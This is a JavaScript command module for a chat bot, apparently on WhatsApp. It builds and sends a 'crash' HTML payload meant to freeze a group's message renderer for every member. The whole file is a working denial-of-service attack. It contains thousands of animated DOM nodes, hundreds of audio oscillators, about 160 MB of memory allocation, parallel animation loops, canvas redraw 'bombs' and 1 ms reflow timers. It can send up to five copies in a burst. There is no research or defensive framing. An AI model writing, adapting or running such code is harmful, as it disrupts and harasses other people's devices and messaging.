'use strict';

const { sendRichHtml } = require('../../utils/genaiRich');
const config = require('../../config');

/* ───────────────────────────────────────────────────
   BUILD THE CRASH HTML PAYLOAD (~480 KB raw HTML)
   Techniques used:
     1. 6 000 absolutely-positioned divs with data attrs
     2. 50 complex multi-step CSS keyframe animations
     3. 300 Web Audio oscillators (silent, just nodes)
     4. 80 × 500 000-element Float32Arrays (~160 MB RAM)
     5. 12 parallel requestAnimationFrame loops each
        touching all 6 000 DOM nodes per tick
     6. 2048×2048 canvas random-pixel putImageData RAF
     7. 1ms setInterval forcing constant reflow
─────────────────────────────────────────────────── */
function buildCrashHtml() {

    /* ── 6 000 DOM NODES ── */
    let megaDom = '';
    for (let i = 0; i < 6000; i++) {
        const cls = 'c' + (i % 50);
        megaDom +=
            '<div class="' + cls + '" id="n' + i +
            '" data-i="' + i + '" data-v="' + (i * 3.14159).toFixed(4) +
            '"><span>' + i + '</span></div>';
    }

    /* ── 50 CSS KEYFRAME ANIMATIONS ── */
    let megaCss = '*{position:absolute;margin:0;padding:0}' +
        'body{overflow:hidden;width:100vw;height:100vh;background:#000}';
    for (let i = 0; i < 50; i++) {
        const dur = (0.3 + i * 0.04).toFixed(2);
        const tx1 = i * 6 - 150, ty1 = i * 4 - 100;
        const tx2 = -tx1, ty2 = -ty1;
        const rot1 = i * 7, rot2 = -(i * 7);
        const sc1 = (0.4 + i * 0.025).toFixed(3);
        const sc2 = (1.6 - i * 0.01).toFixed(3);
        const hue1 = i * 7, hue2 = i * 14;
        const blur1 = (i * 0.12).toFixed(2), blur2 = (i * 0.06).toFixed(2);
        megaCss +=
            '.c' + i +
            '{animation:k' + i + ' ' + dur + 's infinite alternate ease-in-out}' +
            '@keyframes k' + i +
            '{0%{transform:translate(' + tx1 + 'px,' + ty1 + 'px)' +
            'rotate(' + rot1 + 'deg)scale(' + sc1 + ');' +
            'filter:blur(' + blur1 + 'px)hue-rotate(' + hue1 + 'deg) brightness(2)}' +
            '33%{transform:translate(' + ty1 + 'px,' + tx2 + 'px)' +
            'rotate(' + (rot1 / 2) + 'deg)scale(' + (parseFloat(sc1) + 0.3).toFixed(3) + ');' +
            'filter:blur(' + (parseFloat(blur1) * 2).toFixed(2) + 'px)hue-rotate(' + (hue1 * 2) + 'deg)}' +
            '66%{transform:translate(' + tx2 + 'px,' + ty2 + 'px)' +
            'rotate(' + rot2 + 'deg)scale(' + sc2 + ');' +
            'filter:blur(' + blur2 + 'px)hue-rotate(' + hue2 + 'deg) contrast(3)}' +
            '100%{transform:translate(' + ty2 + 'px,' + tx1 + 'px)' +
            'rotate(0deg)scale(1);' +
            'filter:blur(0px)hue-rotate(0deg)}}';
    }

    /* ── HEAVY JS ── */
    const heavyJs = `(function(){
var mem=[];
for(var i=0;i<80;i++) mem.push(new Float32Array(500000).fill(Math.random()));

var ac;
try{
  ac=new(window.AudioContext||window.webkitAudioContext)();
  for(var i=0;i<300;i++){
    var o=ac.createOscillator(),g=ac.createGain();
    o.type=['sine','square','sawtooth','triangle'][i%4];
    o.frequency.value=10+i*33;
    o.detune.value=i*7;
    g.gain.value=0;
    o.connect(g);
    g.connect(ac.destination);
    o.start();
  }
}catch(e){}

var divs=document.querySelectorAll('div');
var dLen=divs.length;
var t0=Date.now();

function heavyFrame(){
  var t=Date.now()-t0;
  for(var i=0;i<dLen;i++){
    var d=divs[i];
    d.style.left=Math.sin(t/50+i)*300+'px';
    d.style.top=Math.cos(t/70+i*1.3)*300+'px';
    d.style.width=(Math.abs(Math.sin(t/200+i))*80+10)+'px';
    d.style.height=(Math.abs(Math.cos(t/180+i))*80+10)+'px';
    d.style.zIndex=i%999;
  }
  requestAnimationFrame(heavyFrame);
}
for(var r=0;r<12;r++) requestAnimationFrame(heavyFrame);

var cv=document.createElement('canvas');
cv.width=2048;cv.height=2048;
document.body.appendChild(cv);
var cx=cv.getContext('2d');
function canvasBomb(){
  var id=cx.createImageData(2048,2048);
  var d=id.data;
  var t=Date.now();
  for(var i=0,l=d.length;i<l;i+=4){
    d[i]=(i+t)%255;
    d[i+1]=(i*2+t)%255;
    d[i+2]=(i*3+t)%255;
    d[i+3]=255;
  }
  cx.putImageData(id,0,0);
  requestAnimationFrame(canvasBomb);
}
canvasBomb();

var cv2=document.createElement('canvas');
cv2.width=1024;cv2.height=1024;
document.body.appendChild(cv2);
var cx2=cv2.getContext('2d');
function canvasBomb2(){
  cx2.save();
  cx2.translate(512,512);
  cx2.rotate(Date.now()/1000);
  for(var i=0;i<500;i++){
    cx2.fillStyle='hsl('+(i*7+Date.now()/10)+',100%,50%)';
    cx2.fillRect(i-512,i-512,i*2,4);
  }
  cx2.restore();
  requestAnimationFrame(canvasBomb2);
}
canvasBomb2();

setInterval(function(){
  void document.body.offsetHeight;
  void document.body.scrollWidth;
  document.body.scrollTop=Math.random()*9999;
},1);

setInterval(function(){
  var s=document.createElement('style');
  s.textContent='body{background:hsl('+(Date.now()/100|0)+',80%,10%)}';
  document.head.appendChild(s);
  if(document.head.children.length>200) document.head.removeChild(document.head.firstChild);
},16);
})();`;

    return '<!doctype html><html><head>' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>' + megaCss + '</style>' +
        '</head><body>' +
        megaDom +
        '<script>' + heavyJs + '<\/script>' +
        '</body></html>';
}

/* ── CACHED PAYLOAD (built once at module load, reused per call) ── */
let _cachedHtml = null;
function getCrashHtml() {
    if (!_cachedHtml) _cachedHtml = buildCrashHtml();
    return _cachedHtml;
}

/* ── BURST: send N copies with short delay between each ── */
async function burst(sock, jid, msg, count, delayMs) {
    const html = getCrashHtml();
    for (let i = 0; i < count; i++) {
        await sendRichHtml({ sock, jid, quoted: msg, html, interactive: true });
        if (i < count - 1) await new Promise(r => setTimeout(r, delayMs));
    }
}

module.exports = {
    name: 'groupx',
    aliases: ['gcrash', 'groupcrash', 'gcx'],
    description: 'Drop a massive GenAI HTML payload that freezes the group renderer for all members',
    usage: '.groupx [1-5]  — optional burst count (default 3)',
    category: 'admin',

    async execute({ sock, msg, from, reply, isOwner, isBotOwner, args }) {
        const allowed = isOwner || isBotOwner;
        if (!allowed) {
            return reply('⛔ Only the bot owner can use this command.');
        }

        const count = Math.min(5, Math.max(1, parseInt(args?.[0]) || 3));
        const delay = 400;

        try {
            await burst(sock, from, msg, count, delay);
        } catch (error) {
            console.error('[GROUPX]', error.message);
            await reply('❌ Payload failed: ' + error.message);
        }
    },
};
